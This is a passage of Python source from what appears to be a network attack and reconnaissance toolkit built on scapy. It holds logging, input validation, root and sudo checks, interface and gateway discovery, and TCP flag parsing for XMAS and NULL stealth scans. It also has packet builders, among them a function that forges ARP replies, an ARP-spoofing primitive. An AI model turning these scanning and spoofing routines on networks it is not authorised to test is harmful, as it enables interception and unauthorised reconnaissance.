        self.ended_at = time.time()
        elapsed = (self.ended_at or time.time()) - self.started_at
        payload = OrderedDict([
            ("tool", __framework__),
            ("version", __version__),
            ("session", self.session_id),
            ("hostname", platform.node()),
            ("platform", platform.platform()),
            ("python", platform.python_version()),
            ("started", format_timestamp(self.started_at)),
            ("ended", format_timestamp(self.ended_at)),
            ("duration_seconds", round(elapsed, 2)),
            ("duration_human", format_duration(elapsed)),
            ("event_counts", dict(sorted(self.counters.items()))),
            ("total_events", len(self._events)),
            ("log_txt", self.txt_path),
            ("log_json", self.json_path),
            ("summary_json", self.summary_path),
        ])
        try:
            with open(self.summary_path, "w", encoding="utf-8") as handle:
                json.dump(payload, handle, indent=2, default=str)
        except OSError as exc:
            warn("could not write session summary: %s" % exc)
        self.event("session", "session summary generated", data={"duration": payload["duration_human"]})
        return payload

    def tail(self, count: int = 40, kind: str = "") -> List[str]:
        with self._lock:
            events = list(self._events)
        if kind:
            events = [e for e in events if e["kind"] == kind]
        lines: List[str] = []
        for record in events[-max(1, count):]:
            lines.append("[%s] [%-8s] [%-12s] %s" % (
                record["ts"], record["level"], record["kind"], record["message"]))
        return lines

    def close(self) -> None:
        if self._closed:
            return
        self._closed = True
        with self._lock:
            for handle in (self._txt_handle, self._json_handle):
                try:
                    if handle:
                        handle.flush()
                        handle.close()
                except (OSError, ValueError):
                    continue
            self._txt_handle = None
            self._json_handle = None


class TerminalMirror:
    """
    sys.stdout proxy that tees everything the operator sees into the session
    ledger when terminal mirroring is enabled. File writes go through the
    logger directly, so there is no possibility of recursive logging.
    """

    def __init__(self, stream: Any, logger: EventLogger) -> None:
        self._stream = stream
        self._logger = logger
        self._buffer = ""

    def write(self, data: str) -> int:
        try:
            self._stream.write(data)
            self._stream.flush()
        except (OSError, ValueError, AttributeError):
            return 0
        try:
            if self._logger.mirror_terminal and data:
                self._buffer += data
                while "\n" in self._buffer:
                    line, self._buffer = self._buffer.split("\n", 1)
                    if line.strip():
                        self._logger.terminal(line)
        except Exception:
            # Mirroring must never interfere with terminal output.
            self._buffer = ""
        return len(data)

    def flush(self) -> None:
        try:
            self._stream.flush()
        except (OSError, ValueError):
            return

    def isatty(self) -> bool:
        try:
            return bool(self._stream.isatty())
        except (AttributeError, ValueError):
            return False

    def fileno(self) -> int:
        return self._stream.fileno()

    def __getattr__(self, item: str) -> Any:
        return getattr(self._stream, item)


# ---------------------------------------------------------------------------
# Defensive input parsing layer (every user value enters the system here)
# ---------------------------------------------------------------------------
def prompt_text(question: str, default: Optional[str] = None,
                allow_blank: bool = False) -> Union[str, object]:
    """Prompt for a free-text value. Returns PROMPT_ABORT on Ctrl-C / EOF."""
    suffix = " [%s]" % default if default not in (None, "") else ""
    try:
        raw = input("%s%s: " % (c(question, "bcyan"), c(suffix, "grey")))
    except EOFError:
        raise InputExhausted("standard input closed while prompting for: %s" % question)
    except KeyboardInterrupt:
        out("")
        return PROMPT_ABORT
    value = raw.strip()
    if not value:
        if default is not None:
            return default
        if allow_blank:
            return ""
        warn("empty input is not accepted here.")
        return PROMPT_ABORT
    return value


def prompt_int(question: str, minimum: Optional[int] = None, maximum: Optional[int] = None,
               default: Optional[int] = None) -> Union[int, object]:
    """Prompt for a bounded integer with full parse-failure containment."""
    while True:
        raw = prompt_text(question, default=None if default is None else str(default))
        if raw is PROMPT_ABORT:
            if default is not None:
                return default
            return PROMPT_ABORT
        try:
            value = int(str(raw).strip(), 10)
        except (TypeError, ValueError):
            warn("'%s' is not a valid integer - retry (or press Ctrl-C to abort)." % raw)
            continue
        if minimum is not None and value < minimum:
            warn("value must be >= %d." % minimum)
            continue
        if maximum is not None and value > maximum:
            warn("value must be <= %d." % maximum)
            continue
        return value


def prompt_float(question: str, minimum: Optional[float] = None,
                 maximum: Optional[float] = None,
                 default: Optional[float] = None) -> Union[float, object]:
    while True:
        raw = prompt_text(question, default=None if default is None else str(default))
        if raw is PROMPT_ABORT:
            if default is not None:
                return default
            return PROMPT_ABORT
        try:
            value = float(str(raw).strip())
        except (TypeError, ValueError):
            warn("'%s' is not a valid number - retry." % raw)
            continue
        if minimum is not None and value < minimum:
            warn("value must be >= %s." % minimum)
            continue
        if maximum is not None and value > maximum:
            warn("value must be <= %s." % maximum)
            continue
        return value


def prompt_yes_no(question: str, default: bool = False) -> bool:
    marker = "Y/n" if default else "y/N"
    try:
        raw = input("%s [%s]: " % (c(question, "bcyan"), marker))
    except EOFError:
        raise InputExhausted("standard input closed while prompting for: %s" % question)
    except KeyboardInterrupt:
        out("")
        return False
    value = raw.strip().lower()
    if not value:
        return default
    return value in ("y", "yes", "1", "true")


def prompt_choice(question: str, choices: Sequence[str], default: Optional[str] = None) -> Union[str, object]:
    rendered = "/".join(choices)
    while True:
        raw = prompt_text("%s (%s)" % (question, rendered), default=default)
        if raw is PROMPT_ABORT:
            return PROMPT_ABORT
        candidate = str(raw).strip().lower()
        for option in choices:
            if candidate == option.lower():
                return option
        warn("pick one of: %s" % rendered)


def parse_port(raw: Any, allow_zero: bool = True) -> int:
    """Validate a TCP/UDP port number."""
    try:
        port = int(str(raw).strip(), 10)
    except (TypeError, ValueError):
        raise FrameworkError("'%s' is not a valid port number" % raw)
    low = 0 if allow_zero else 1
    if not (low <= port <= 65535):
        raise FrameworkError("port %d outside legal range %d-65535" % (port, low))
    return port


def parse_port_list(raw: Any) -> List[int]:
    """Parse '22,80,443', '1-1024' or '22,80,1000-1010' into a sorted unique list."""
    text = str(raw or "").strip()
    if not text:
        raise FrameworkError("empty port specification")
    ports: List[int] = []
    for chunk in re.split(r"[,\s]+", text):
        if not chunk:
            continue
        match = re.match(r"^(\d+)\s*-\s*(\d+)$", chunk)
        if match:
            low, high = int(match.group(1)), int(match.group(2))
            if low > high:
                low, high = high, low
            if high - low > 65535:
                raise FrameworkError("port range %s is absurdly wide" % chunk)
            ports.extend(range(low, high + 1))
        else:
            ports.append(parse_port(chunk))
    unique = sorted(set(p for p in ports if 0 <= p <= 65535))
    if not unique:
        raise FrameworkError("no usable ports parsed from '%s'" % raw)
    return unique


def parse_ipv4(raw: Any) -> str:
    """Validate a dotted-quad IPv4 literal, returning the canonical form."""
    text = str(raw or "").strip()
    try:
        addr = ipaddress.IPv4Address(text)
    except (ipaddress.AddressValueError, ValueError):
        raise FrameworkError("'%s' is not a valid IPv4 address" % text)
    return str(addr)


def resolve_target(raw: Any, allow_failure_none: bool = True) -> Optional[str]:
    """
    Resolve an operator-supplied target into an IPv4 literal.

    Accepts dotted-quad literals directly and falls back to the system resolver
    for hostnames. Returns None (or raises, in hard-fail mode) rather than
    letting a DNS failure bubble up into the menu loop.
    """
    text = str(raw or "").strip()
    if not text:
        if allow_failure_none:
            return None
        raise FrameworkError("empty target")
    try:
        return parse_ipv4(text)
    except FrameworkError:
        pass
    try:
        return socket.gethostbyname(text)
    except (socket.gaierror, OSError, UnicodeError) as exc:
        LOGGER.event("warn", "resolution failed for '%s': %s" % (text, exc), level="WARN")
        if allow_failure_none:
            return None
        raise FrameworkError("unable to resolve '%s': %s" % (text, exc))


def reverse_lookup(ip: str) -> str:
    """Best-effort PTR lookup; returns an empty string when unavailable."""
    try:
        return socket.gethostbyaddr(str(ip))[0]
    except (socket.herror, socket.gaierror, OSError):
        return ""


def parse_network(raw: Any, max_hosts: int = MAX_SWEEP_HOSTS) -> ipaddress.IPv4Network:
    """Accept '1.2.3.4', '1.2.3.0/24' or '1.2.3.4/24' (non-strict) as a network."""
    text = str(raw or "").strip()
    if not text:
        raise FrameworkError("empty target specification")
    if "/" not in text:
        text = "%s/32" % text
    try:
        network = ipaddress.IPv4Network(text, strict=False)
    except (ipaddress.NetmaskValueError, ValueError, ipaddress.AddressValueError):
        raise FrameworkError("'%s' is not a valid IPv4 network/CIDR" % raw)
    host_count = network.num_addresses if network.prefixlen < 31 else 1
    if host_count > max_hosts:
        raise FrameworkError(
            "network %s contains %d addresses, above the configured sweep ceiling of %d"
            % (network, host_count, max_hosts))
    return network


def iter_hosts(network: ipaddress.IPv4Network) -> List[str]:
    """Enumerate probeable hosts, collapsing /31 and /32 correctly."""
    if network.prefixlen >= 31:
        return [str(network.network_address)]
    return [str(host) for host in network.hosts()]


def parse_mac(raw: Any) -> str:
    """Normalise a MAC address to lower-case colon-separated form."""
    text = str(raw or "").strip().lower().replace("-", ":").replace(".", ":")
    match = re.fullmatch(r"([0-9a-f]{2}:){5}[0-9a-f]{2}", text)
    if not match:
        raise FrameworkError("'%s' is not a valid MAC address" % raw)
    return text


# Named scan aliases accepted anywhere a flag mask is expected.
FLAG_ALIASES = {
    "XMAS": "FPU", "XMASSCAN": "FPU", "XMAS-SCAN": "FPU", "FUP": "FPU",
    "NULL": "", "NULLSCAN": "", "NONE": "", "N": "", "NIL": "0",
    "SYNACK": "SA", "SYN-ACK": "SA", "FINPSHURG": "FPU", "ACKSCAN": "A",
    "MERRYXMAS": "FPU", "ALL": "FPU",
}


def parse_flag_spec(raw: Any) -> str:
    """
    Convert a flag specification into a scapy flag string.

    Accepts: 'S', 'SA', 'syn,ack', 'SYN+PSH', 'FA', 'xmas' (=FPU), and
    'none'/'null'/'N' which produce a legal empty (NULL) flag mask.
    """
    text = str(raw or "").strip().upper()
    if text in ("", "NONE", "N", "NULL", "NULLSCAN", "NIL"):
        return ""
    tokens = re.split(r"[,\+\s]+", text)
    letters: List[str] = []
    for token in tokens:
        if not token:
            continue
        if token in FLAG_ALIASES:
            letters.extend(FLAG_ALIASES[token])
            continue
        if token in FLAG_MAP:
            letters.append(FLAG_MAP[token])
            continue
        expanded = True
        for char in token:
            if char == "N":
                continue
            if char not in FLAG_MAP.values():
                expanded = False
                break
        if expanded:
            letters.extend(ch for ch in token if ch != "N")
        else:
            raise FrameworkError("unrecognised TCP flag token '%s'" % token)
    deduped: List[str] = []
    for letter in letters:
        if letter not in deduped:
            deduped.append(letter)
    return "".join(deduped)


def random_source_port() -> int:
    return random.randint(1024, 65535)


def now_iso() -> str:
    return _dt.datetime.now().isoformat(timespec="seconds")



# ---------------------------------------------------------------------------
# Privilege enforcement layer
# ---------------------------------------------------------------------------
class Privileges:
    """
    Root/administrator gate. Raw sockets, forged layer-2 frames and kernel
    routing toggles require superuser authority, so every network module calls
    through this class before touching the wire.
    """

    @staticmethod
    def euid() -> Optional[int]:
        try:
            return os.geteuid()
        except AttributeError:
            return None

    @staticmethod
    def is_windows() -> bool:
        return platform.system().lower().startswith("win")

    @classmethod
    def is_root(cls) -> bool:
        if cls.is_windows():
            try:
                import ctypes  # local import: only required on Windows
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            except Exception:
                return False
        euid = cls.euid()
        if euid is None:
            return False
        return euid == 0

    @staticmethod
    def raw_socket_available() -> bool:
        """Probe whether AF_INET/SOCK_RAW/ICMP can actually be opened."""
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            probe.close()
            return True
        except (OSError, AttributeError, ValueError):
            return False

    @classmethod
    def describe(cls) -> Dict[str, Any]:
        return OrderedDict([
            ("platform", platform.system()),
            ("release", platform.release()),
            ("hostname", platform.node()),
            ("user", cls._user_name()),
            ("euid", "n/a" if cls.euid() is None else cls.euid()),
            ("is_root", cls.is_root()),
            ("raw_socket_ok", cls.raw_socket_available()),
            ("can_privilege_escalate", cls.can_sudo()),
        ])

    @staticmethod
    def _user_name() -> str:
        for getter in ("getlogin", "getpass.getuser"):
            try:
                if getter == "getlogin":
                    name = os.getlogin()
                    if name:
                        return name
                else:
                    import getpass
                    return getpass.getuser()
            except Exception:
                continue
        return os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"

    @staticmethod
    def can_sudo() -> bool:
        """Non-interactive sudo probe: reports whether `sudo -n true` succeeds."""
        if not shutil.which("sudo"):
            return False
        try:
            proc = subprocess.run(
                ["sudo", "-n", "true"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                timeout=5, check=False,
            )
            return proc.returncode == 0
        except (OSError, subprocess.SubprocessError):
            return False


def require_root(label: str, interactive: bool = True) -> bool:
    """
    Hard privilege gate. Returns True when the process may open raw sockets.
    Emits an actionable remediation hint and journals the denial otherwise.
    """
    if Privileges.is_root():
        return True
    if Privileges.raw_socket_available():
        # Unprivileged raw sockets (e.g. userns with CAP_NET_RAW) are sufficient.
        warn("%s: running unprivileged, but CAP_NET_RAW appears available." % label)
        LOGGER.event("privilege", "%s: unprivileged raw-socket capability detected" % label,
                     level="WARN")
        return True
    err("%s requires root/administrator privileges (os.geteuid() must be 0)." % label)
    if Privileges.can_sudo():
        note("Passwordless sudo detected. Relaunch with:")
        out("      %s" % c("sudo %s %s" % (sys.executable, sys.argv[0]), "bgreen"))
    else:
        note("Relaunch from an elevated shell, e.g. %s"
             % c("sudo python3 %s" % os.path.basename(SCRIPT_PATH), "bgreen"))
    LOGGER.event("privilege", "%s blocked: insufficient privileges" % label, level="ERROR",
                 data=Privileges.describe())
    if interactive:
        try:
            input(c("      Press <Enter> to return to the menu.", "grey"))
        except (EOFError, KeyboardInterrupt):
            out("")
    return False


def root_required(func: Callable) -> Callable:
    """Decorator: refuse entry to a module unless the privilege gate passes."""
    label = getattr(func, "MODULE_LABEL", None) or getattr(func, "__name__", "module").replace("_", " ")

    def wrapper(*args: Any, **kwargs: Any) -> Any:
        if not Privileges.is_root() and not Privileges.raw_socket_available():
            err("%s: blocked - superuser authority required." % label)
            LOGGER.event("privilege", "%s blocked by decorator" % label, level="ERROR")
            return None
        return func(*args, **kwargs)

    wrapper.__name__ = getattr(func, "__name__", "wrapped")
    wrapper.__doc__ = getattr(func, "__doc__", "")
    wrapper.MODULE_LABEL = label
    return wrapper


def require_scapy(label: str) -> bool:
    """Gate that verifies the scapy engine is importable before use."""
    if SCAPY_AVAILABLE:
        return True
    err("%s: scapy engine unavailable (%s)" % (label, SCAPY_ERROR or "unknown import error"))
    note("Install it with:  %s" % c("python3 -m pip install scapy", "bgreen"))
    note("Or use menu option [11] Dependency Doctor for a guided install.")
    LOGGER.event("dependency", "%s blocked: scapy missing" % label, level="ERROR",
                 data={"error": SCAPY_ERROR})
    return False


# ---------------------------------------------------------------------------
# Interface, route and neighbour discovery
# ---------------------------------------------------------------------------
class InterfaceManager:
    """Enumerate local interfaces, addresses, hardware IDs, routes and gateways."""

    @staticmethod
    def list_interfaces() -> List[Dict[str, Any]]:
        inventory: List[Dict[str, Any]] = []
        if SCAPY_AVAILABLE:
            try:
                for name in sorted(get_if_list()):
                    entry = OrderedDict()
                    entry["name"] = name
                    entry["ipv4"] = InterfaceManager._scapy_iface_value(name, "ipv4")
                    entry["mac"] = InterfaceManager._scapy_iface_value(name, "mac")
                    entry["up"] = InterfaceManager._is_up(name)
                    inventory.append(entry)
                if inventory:
                    return inventory
            except Exception as exc:
                LOGGER.event("warn", "scapy interface enumeration failed: %s" % exc, level="WARN")
        return InterfaceManager._fallback_interfaces()

    @staticmethod
    def _scapy_iface_value(name: str, kind: str) -> str:
        try:
            if kind == "mac":
                return str(scapy.get_if_hwaddr(name))
            if hasattr(scapy, "get_if_addr"):
                return str(scapy.get_if_addr(name))
        except Exception:
            return "n/a"
        return "n/a"

    @staticmethod
    def _fallback_interfaces() -> List[Dict[str, Any]]:
        inventory: List[Dict[str, Any]] = []
        names: List[str] = []
        if shutil.which("ip"):
            proc = InterfaceManager._run(["ip", "-o", "link", "show"])
            for line in proc.splitlines():
                match = re.match(r"^\d+:\s+([^:@]+)[:@]", line)
                if match:
                    names.append(match.group(1).strip())
        elif shutil.which("ifconfig"):
            proc = InterfaceManager._run(["ifconfig", "-a"])
            for line in proc.splitlines():
                match = re.match(r"^([A-Za-z0-9_.:-]+)[:\s]", line)
                if match and not line.startswith((" ", "\t")):
                    names.append(match.group(1))
        if not names:
            names = [name for _, name in socket.if_nameindex()] if hasattr(socket, "if_nameindex") else []
        for name in names:
            inventory.append(OrderedDict([
                ("name", name),
                ("ipv4", InterfaceManager.address(name) or "unassigned"),
                ("mac", InterfaceManager.hwaddr(name)),
                ("up", InterfaceManager._is_up(name)),
            ]))
        return inventory

    @staticmethod
    def _run(command: Sequence[str], timeout: float = 6.0) -> str:
        try:
            proc = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
                                  timeout=timeout, check=False, text=True)
            return proc.stdout or ""
        except (OSError, subprocess.SubprocessError):
            return ""

    @staticmethod
    def _is_up(name: str) -> bool:
        try:
            flags_path = "/sys/class/net/%s/flags" % name
            if os.path.exists(flags_path):
                with open(flags_path, "r", encoding="utf-8") as handle:
                    raw = handle.read().strip()
                return bool(int(raw, 16) & 0x1)
        except (OSError, ValueError):
            pass
        if shutil.which("ip"):
            proc = InterfaceManager._run(["ip", "link", "show", "dev", name])
            if "state UP" in proc or "UP" in proc.split("\n")[0]:
                return True
        return False

    @staticmethod
    def address(iface: str) -> str:
        if SCAPY_AVAILABLE:
            try:
                addr = str(scapy.get_if_addr(iface))
                if addr and addr != "0.0.0.0":
                    return addr
            except Exception:
                pass
        if shutil.which("ip"):
            proc = InterfaceManager._run(["ip", "-4", "addr", "show", "dev", iface])
            match = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", proc)
            if match:
                return match.group(1)
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            probe.settimeout(0.4)
            probe.connect(("8.8.8.8", 53))
            addr = probe.getsockname()[0]
            probe.close()
            return addr
        except OSError:
            return ""

    @staticmethod
    def hwaddr(iface: str) -> str:
        if SCAPY_AVAILABLE:
            try:
                return str(get_if_hwaddr(iface))
            except Exception:
                pass
        path = "/sys/class/net/%s/address" % iface
        try:
            with open(path, "r", encoding="utf-8") as handle:
                return handle.read().strip()
        except OSError:
            return "n/a"

    @staticmethod
    def primary_interface() -> Optional[str]:
        """Interface carrying the default route, or first non-loopback iface."""
        if SCAPY_AVAILABLE:
            try:
                route = scapy_conf.route.route("0.0.0.0")
                if route and route[0]:
                    return str(route[0])
            except Exception:
                pass
        for entry in InterfaceManager.list_interfaces():
            if entry.get("name") and entry["name"] != "lo" and entry.get("ipv4") not in ("", "n/a"):
                return str(entry["name"])
        return None

    @staticmethod
    def discover_gateway(iface: Optional[str] = None) -> Optional[str]:
        """Locate the default gateway across Linux, macOS, Windows and scapy."""
        system = platform.system().lower()
        if system == "linux":
            try:
                with open("/proc/net/route", "r", encoding="utf-8") as handle:
                    for line in handle.readlines()[1:]:
                        fields = line.split()
                        if len(fields) < 4:
                            continue
                        destination, gateway_hex, flags = fields[1], fields[2], fields[3]
                        if destination != "00000000":
                            continue
                        if iface and fields[0] != iface:
                            continue
                        if not (int(flags, 16) & 0x2):  # RTF_GATEWAY
                            continue
                        return socket.inet_ntoa(struct.pack("<L", int(gateway_hex, 16)))
            except (OSError, ValueError, IndexError, struct.error):
                pass
            proc = InterfaceManager._run(["ip", "route", "show", "default"])
            match = re.search(r"default\s+via\s+(\d+\.\d+\.\d+\.\d+)", proc)
            if match:
                return match.group(1)
        elif system == "darwin":
            proc = InterfaceManager._run(
                ["route", "-n", "get", "default"] if not iface else ["route", "-n", "get", "default", "-ifscope", iface])
            match = re.search(r"gateway:\s*(\d+\.\d+\.\d+\.\d+)", proc)
            if match:
                return match.group(1)
        elif InterfaceManager._platform_is_windows():
            proc = InterfaceManager._run(["ipconfig"])
            for line in proc.splitlines():
                if "Default Gateway" in line:
                    match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if match:
                        return match.group(1)
        if SCAPY_AVAILABLE:
            try:
                route = scapy_conf.route.route("0.0.0.0")
                if route and len(route) > 1 and route[1] != "0.0.0.0":
                    return str(route[1])
            except Exception:
                pass
        return None

    @staticmethod
    def _platform_is_windows() -> bool:
        return platform.system().lower().startswith("win")

    @staticmethod
    def route_table() -> List[Dict[str, str]]:
        """Return the kernel routing table in a normalised list of dicts."""
        rows: List[Dict[str, str]] = []
        system = platform.system().lower()
        if system == "linux" and os.path.exists("/proc/net/route"):
            try:
                with open("/proc/net/route", "r", encoding="utf-8") as handle:
                    for line in handle.readlines()[1:]:
                        fields = line.split()
                        if len(fields) < 8:
                            continue
                        rows.append(OrderedDict([
                            ("iface", fields[0]),
                            ("destination", InterfaceManager._hex_to_ip(fields[1])),
                            ("gateway", InterfaceManager._hex_to_ip(fields[2])),
                            ("flags", "0x%s" % fields[3]),
                            ("metric", fields[6]),
                            ("mask", InterfaceManager._hex_to_ip(fields[7])),
                            ("raw_refcnt", fields[4]),
                        ]))
                if rows:
                    return rows
            except (OSError, ValueError, IndexError):
                pass
        command = ["netstat", "-rn"] if shutil.which("netstat") else (["ip", "route"] if shutil.which("ip") else [])
        if command:
            proc = InterfaceManager._run(command)
            for line in proc.splitlines():
                stripped = line.strip()
                if not stripped or stripped.startswith(("Kernel", "Destination", "Routing", "Internet", "Route")):
                    continue
                if "default" not in stripped and not re.match(r"^\d+\.\d+\.\d+\.\d+", stripped):
                    continue
                rows.append(OrderedDict([("entry", stripped)]))
        return rows

    @staticmethod
    def _hex_to_ip(hex_value: str) -> str:
        try:
            return socket.inet_ntoa(struct.pack("<L", int(hex_value, 16)))
        except (ValueError, struct.error):
            return "0.0.0.0"

    @staticmethod
    def local_network(iface: Optional[str] = None) -> Optional[ipaddress.IPv4Network]:
        """Best-effort local subnet CIRD derived from interface + netmask."""
        target_iface = iface or InterfaceManager.primary_interface()
        if not target_iface:
            return None
        addr = InterfaceManager.address(target_iface)
        if not addr or addr == "0.0.0.0":
            return None
        mask = InterfaceManager.netmask(target_iface)
        try:
            return ipaddress.IPv4Network("%s/%s" % (addr, mask), strict=False)
        except (ValueError, ipaddress.NetmaskValueError):
            return None

    @staticmethod
    def netmask(iface: str) -> str:
        if shutil.which("ip"):
            proc = InterfaceManager._run(["ip", "-4", "addr", "show", "dev", iface])
            match = re.search(r"inet\s+\d+\.\d+\.\d+\.\d+/(\d+)", proc)
            if match:
                prefix = int(match.group(1))
                try:
                    return str(ipaddress.IPv4Network("0.0.0.0/%d" % prefix).netmask)
                except ValueError:
                    return "255.255.255.0"
        if shutil.which("ifconfig"):
            proc = InterfaceManager._run(["ifconfig", iface])
            match = re.search(r"netmask\s+(0x[0-9a-fA-F]+|\d+\.\d+\.\d+\.\d+)", proc)
            if match:
                token = match.group(1)
                if token.startswith("0x"):
                    try:
                        return socket.inet_ntoa(struct.pack(">L", int(token, 16)))
                    except (ValueError, struct.error):
                        return "255.255.255.0"
                return token
        return "255.255.255.0"

    @staticmethod
    def display() -> None:
        heading("INTERFACE INVENTORY")
        interfaces = InterfaceManager.list_interfaces()
        if not interfaces:
            warn("no network interfaces could be enumerated.")
            return
        header = "%-16s %-18s %-20s %-6s" % ("INTERFACE", "IPv4 ADDRESS", "MAC ADDRESS", "STATE")
        out(c(header, "bold"))
        out("-" * len(header))
        for entry in interfaces:
            state = c("UP", "bgreen") if entry.get("up") else c("DOWN", "bred")
            out("%-16s %-18s %-20s %-6s" % (
                entry.get("name", "?"),
                entry.get("ipv4", "n/a"),
                entry.get("mac", "n/a"),
                state,
            ))


# ---------------------------------------------------------------------------
# Packet construction + reply classification primitives
# ---------------------------------------------------------------------------
class PacketBuilder:
    """Thin, validated constructors over scapy so no module hand-rolls layers."""

    @staticmethod
    def tcp(dst: str, dport: int, flags: str = "S", sport: Optional[int] = None,
            ttl: int = 64, window: int = 64240, seq: Optional[int] = None,
            ack_num: Optional[int] = None, payload: bytes = b"",
            df: bool = False, tos: int = 0, ident: Optional[int] = None) -> Any:
        if not SCAPY_AVAILABLE:
            raise FrameworkError("scapy engine unavailable - TCP construction impossible")
        if not 0 <= int(dport) <= 65535:
            raise FrameworkError("destination port %s out of range" % dport)
        ip_layer = IP(dst=dst, ttl=int(ttl), tos=int(tos))
        if df:
            ip_layer.flags = "DF"
        if ident is not None:
            ip_layer.id = int(ident) & 0xFFFF
        tcp_layer = TCP(
            sport=int(sport) if sport else random_source_port(),
            dport=int(dport),
            flags=flags if flags else 0,
            window=int(window),
            seq=int(seq) if seq is not None else random.randint(0, 0xFFFFFFFF),
        )
        if ack_num is not None:
            tcp_layer.ack = int(ack_num) & 0xFFFFFFFF
        if payload:
            return ip_layer / tcp_layer / Raw(load=payload)
        return ip_layer / tcp_layer

    @staticmethod
    def udp(dst: str, dport: int, sport: Optional[int] = None, payload: bytes = b"",
            ttl: int = 64) -> Any:
        if not SCAPY_AVAILABLE:
            raise FrameworkError("scapy engine unavailable - UDP construction impossible")
        return IP(dst=dst, ttl=int(ttl)) / UDP(
            sport=int(sport) if sport else random_source_port(),
            dport=int(dport),
        ) / Raw(load=payload or b"")

    @staticmethod
    def icmp(dst: str, icmp_type: int = 8, code: int = 0, ident: Optional[int] = None,
             seq: int = 1, payload: bytes = b"PrismStrike-PROBE", ttl: int = 64) -> Any:
        if not SCAPY_AVAILABLE:
            raise FrameworkError("scapy engine unavailable - ICMP construction impossible")
        return IP(dst=dst, ttl=int(ttl)) / ICMP(
            type=int(icmp_type), code=int(code),
            id=int(ident) if ident is not None else random.randint(0, 0xFFFF),
            seq=int(seq) & 0xFFFF,
        ) / Raw(load=payload)

    @staticmethod
    def arp_request(pdst: str, psrc: Optional[str] = None) -> Any:
        if not SCAPY_AVAILABLE:
            raise FrameworkError("scapy engine unavailable - ARP construction impossible")
        return Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=pdst, psrc=psrc or None)

    @staticmethod
    def arp_reply(pdst: str, hwdst: str, psrc: str, hwsrc: Optional[str] = None,
                  target_mac: Optional[str] = None) -> Any:
        """Forge an ARP reply (op=2) claiming `psrc` lives at `hwsrc`."""
        if not SCAPY_AVAILABLE:
            raise FrameworkError("scapy engine unavailable - ARP construction impossible")
        frame = Ether(dst=hwdst)
        if hwsrc:
            frame.src = hwsrc
            frame = Ether(dst=hwdst, src=hwsrc)
        arp_layer = ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc)
        if hwsrc:
            arp_layer.hwsrc = hwsrc
        if target_mac:
            arp_layer.hwdst = target_mac
        return frame / arp_layer

    @staticmethod
    def packet_fingerprint(pkt: Any) -> str:
        """Compact one-line summary of any crafted or captured packet."""
        try:
            return pkt.summary()
        except Exception:
            return "<unprintable packet>"


class ReplyReviewer:
    """
    Interprets probe answers: TCP flag semantics, ICMP unreachable granularity
    and RTT accounting. Used by the TCP crafter, ICMP module and hping harness.
    """

    # Keys are canonical flag orderings (S,A,F,R,P,U,E,C) - the order produced
    # by the normaliser below. Alternate orderings are kept as explicit aliases
    # so a non-conforming stack still classifies correctly.
    TCP_VERDICTS = {
        "SA": ("OPEN", "Port open - SYN/ACK returned"),
        "S": ("SYN-ONLY", "SYN echoed back without ACK - unusual stack behaviour"),
        "AR": ("CLOSED", "Port closed - RST/ACK returned"),
        "RA": ("CLOSED", "Port closed - RST/ACK returned (alternate flag order)"),
        "R": ("CLOSED", "Port closed - RST returned"),
        "A": ("UNFILTERED", "ACK echoed - host reachable, port state unknown (no RST)"),
        "AF": ("CLOSED", "FIN/ACK answered - closed port with reset semantics"),
        "FA": ("CLOSED", "FIN/ACK answered - closed port with reset semantics"),
        "F": ("CLOSED", "FIN answered - closed port with reset semantics"),
        "AP": ("OPEN|FILTERED", "PSH/ACK answered - application or middlebox reply"),
        "PA": ("OPEN|FILTERED", "PSH/ACK answered - application or middlebox reply"),
        "P": ("OPEN|FILTERED", "PSH answered without ACK - inspect manually"),
        "": ("NULL-REPLY", "Null-flag reply observed"),
    }

    @classmethod
    def _classify_tcp_flags(cls, ordered: str) -> Tuple[str, str]:
        """
        Map a normalised flag string to a verdict, with a semantic fallback for
        combinations that are not in the catalogue (e.g. FAR, FRU, APU).
        """
        if ordered in cls.TCP_VERDICTS:
            return cls.TCP_VERDICTS[ordered]
        if "R" in ordered:
            if "S" in ordered and "A" in ordered:
                return ("CLOSED", "Reset with SYN/ACK (%s) - reset semantics on a closed port" % ordered)
            return ("CLOSED", "Reset-bearing reply (%s) - peer refused the segment" % ordered)
        if "S" in ordered and "A" in ordered:
            return ("OPEN", "SYN/ACK reply (%s) - service accepted the connection" % ordered)
        if "A" in ordered and set(ordered) <= set("APEUC"):
            return ("UNFILTERED", "ACK-bearing reply (%s) with no reset - state unresolved" % ordered)
        if ordered in ("", "NONE"):
            return ("UNFILTERED", "Null-flag reply - inspect manually")
        return ("ANOMALOUS", "Unrecognised flag combination: %s" % ordered)

    @classmethod
    def review(cls, response: Any, sent_at: Optional[float] = None) -> Dict[str, Any]:
        """Return a normalised verdict dictionary for a probe response."""
        review: Dict[str, Any] = OrderedDict([
            ("verdict", "NO-RESPONSE"),
            ("detail", "No reply inside the timeout window (filtered, dropped or host down)"),
            ("source", "-"),
            ("ttl", "-"),
            ("flags", "-"),
            ("icmp", "-"),
            ("rtt_ms", None),
            ("summary", "<no response>"),
        ])
        if response is None:
            return review
        try:
            review["summary"] = str(response.summary())
            review["source"] = str(getattr(response, "src", "-"))
            if response.haslayer(IP):
                review["ttl"] = int(response[IP].ttl)
            if sent_at is not None:
                response_time = float(getattr(response, "time", time.time()))
                review["rtt_ms"] = round(max(0.0, (response_time - sent_at) * 1000.0), 3)
            if response.haslayer(TCP):
                flag_string = str(response[TCP].flags)
                ordered = "".join(ch for ch in "SAFRPUEC" if ch in flag_string)
                review["flags"] = ordered or "NONE"
                verdict, detail = cls._classify_tcp_flags(ordered)
                review["verdict"] = verdict
                review["detail"] = detail
            elif response.haslayer(ICMP):
                icmp_type = int(response[ICMP].type)
                icmp_code = int(response[ICMP].code)
                type_name = ICMP_TYPE_NAMES.get(icmp_type, "ICMP type %d" % icmp_type)
                code_name = ICMP_CODE_NAMES.get(icmp_type, {}).get(icmp_code, "")
                review["icmp"] = "%d/%d" % (icmp_type, icmp_code)
